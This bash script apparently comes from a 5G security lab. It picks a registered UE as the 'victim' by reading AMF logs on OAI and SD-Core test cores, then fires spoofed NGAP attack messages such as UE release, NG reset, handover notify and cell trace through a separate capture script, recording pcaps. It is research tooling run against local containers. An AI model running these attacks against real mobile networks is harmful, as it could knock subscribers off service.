#!/usr/bin/env bash
# Turnkey: capture the evidence still missing after the Open5GS/free5GC/SD-Core
# runs — the 5 newly-added builders fired LIVE (p06/p09/p16/p17/p21) plus OAI's
# (negative) existing attacks. Reuses ./capture_attack.sh (3 pcaps/attack + 30s
# follow-on). Run from ngap_tester/. Safe to re-run (each writes its own subdir).
#
#   bash run_remaining_captures.sh            # does OAI + SD-Core sections
#   SECTION=oai   bash run_remaining_captures.sh
#   SECTION=sdcore bash run_remaining_captures.sh
#
# You (the user) can also run it directly in your own shell via:  ! bash run_remaining_captures.sh
set -uo pipefail
cd "$(dirname "$0")"
SECTION="${SECTION:-all}"

need_img(){ docker images -q ngap-tester >/dev/null 2>&1 || docker build -t ngap-tester .; }
need_img

# ---------------------------------------------------------------- OAI section
# OAI must be the running docker-compose core (net-5glab). If it isn't:
#   ../5g-lab/scripts/core.sh up oai && ../5g-lab/scripts/ran.sh up ueransim oai
run_oai(){
  echo "########## OAI (net-5glab) ##########"
  if ! docker inspect oai-amf >/dev/null 2>&1; then
    echo ">> bringing up OAI"; ( cd ../5g-lab && ./scripts/core.sh up oai && ./scripts/ran.sh up ueransim oai ); sleep 16
  fi
  # ensure UE session, get victim (OAI stats table shows 0x0N)
  docker restart ueransim-oai-ueransim-ue-1 >/dev/null 2>&1; sleep 14
  local V; V=$(docker logs oai-amf 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep '5GMM-REGISTERED' | tail -1 | grep -oE '0x0[0-9a-f]' | head -1)
  V=$((16#${V#0x})); echo ">> OAI victim AMF-UE-NGAP-ID=$V"
  local A=oai-amf S=oai-smf G=ueransim-oai-ueransim-gnb-1
  # existing (negative) attacks
  CFG_CORE=oai ./capture_attack.sh oai_T06_ue_release_no_effect     $A $S $G net-5glab 30 -- ue-release      --amf-ue-id $V --ran-ue-id 99
  docker restart ueransim-oai-ueransim-ue-1 >/dev/null 2>&1; sleep 12
  V=$(docker logs oai-amf 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep '5GMM-REGISTERED' | tail -1 | grep -oE '0x0[0-9a-f]' | head -1); V=$((16#${V#0x}))
  CFG_CORE=oai ./capture_attack.sh oai_T04_ng_reset_no_effect       $A $S $G net-5glab 30 -- ng-reset        --targets $V
  # NEW builders flagged 🔴 on OAI
  docker restart ueransim-oai-ueransim-ue-1 >/dev/null 2>&1; sleep 12
  V=$(docker logs oai-amf 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep '5GMM-REGISTERED' | tail -1 | grep -oE '0x0[0-9a-f]' | head -1); V=$((16#${V#0x}))
  CFG_CORE=oai ./capture_attack.sh oai_p09_handover_notify          $A $S $G net-5glab 30 -- handover-notify --amf-ue-id $V --ran-ue-id 99
  CFG_CORE=oai ./capture_attack.sh oai_p16_ul_nrppa                 $A $S $G net-5glab 30 -- ul-nrppa        --amf-ue-id $V --ran-ue-id 99
  CFG_CORE=oai ./capture_attack.sh oai_p21_ul_ran_status            $A $S $G net-5glab 30 -- ul-ran-status   --amf-ue-id $V --ran-ue-id 99
}

# ---------------------------------------------------------------- SD-Core section
# SD-Core runs on kind (coexists). AMF is a pod -> capture on the node netns.
run_sdcore(){
  echo "########## SD-Core (kind) ##########"
  export AMF_FILTER='sctp or (udp port 8805) or (udp port 2152) or (tcp portrange 8000-9100) or (tcp port 29518)'
  local A=sdcore-control-plane S=- G=ueransim-sdcore-ueransim-gnb-1
  vid(){ kubectl logs -n sdcore -l app=amf --tail=50 2>/dev/null | grep -oE 'AMF_UE_NGAP_ID:[0-9]+' | tail -1 | grep -oE '[0-9]+'; }
  docker restart ueransim-sdcore-ueransim-ue-1 >/dev/null 2>&1; sleep 12
  local V; V=$(vid); echo ">> SD-Core victim=$V"
  # NEW builders flagged 🔴 on SD-Core
  CFG_CORE=sdcore ./capture_attack.sh sdcore_p06_pdu_notify  $A $S $G kind 25 -- pdu-notify --amf-ue-id $V --ran-ue-id 99
  docker restart ueransim-sdcore-ueransim-ue-1 >/dev/null 2>&1; sleep 12; V=$(vid)
  CFG_CORE=sdcore ./capture_attack.sh sdcore_p17_cell_trace  $A $S $G kind 25 -- cell-trace --amf-ue-id $V --ran-ue-id 99
}

case "$SECTION" in
  oai)    run_oai ;;
  sdcore) run_sdcore ;;
  all)    run_sdcore; run_oai ;;
  *) echo "SECTION must be oai|sdcore|all"; exit 1 ;;
esac
echo "== remaining captures done; see pcap/ =="
ls -d pcap/oai_* pcap/sdcore_p* 2>/dev/null
